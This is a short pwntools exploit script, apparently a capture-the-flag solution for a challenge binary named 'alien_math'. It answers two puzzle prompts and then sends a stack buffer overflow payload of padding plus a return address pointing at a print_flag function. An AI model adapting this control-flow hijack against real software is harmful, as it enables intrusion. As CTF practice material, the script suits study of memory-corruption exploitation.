#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./alien_math')

#gdb.attach(p, 'b *0x004012e3\nc')

p.recvuntil('What is the square root of zopnol?\n')
p.sendline('1804289383')

p.recvuntil('How many tewgrunbs are in a qorbnorbf?\n')
p.sendline('7856445899213065428791')

print_flag = 0x004014fb

p.recvuntil('How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?\n')
payload = 'A' * 0x18 + p64(print_flag)
p.sendline(payload)

p.interactive()

